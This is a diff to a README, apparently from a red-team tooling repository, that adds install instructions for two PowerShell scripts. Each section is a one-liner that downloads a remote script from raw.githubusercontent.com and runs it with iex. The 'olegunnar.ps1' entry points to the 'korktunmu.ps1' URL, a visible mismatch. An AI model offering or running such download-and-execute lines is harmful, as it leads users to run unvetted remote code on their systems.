@@ -26,7 +26,13 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 
 ## korktunmu.ps1
+Python and PIP Installation using Chocolatey
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1') 
+```
 
+## olegunnar.ps1
+A glue to use ole-tools
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1') 
 ```
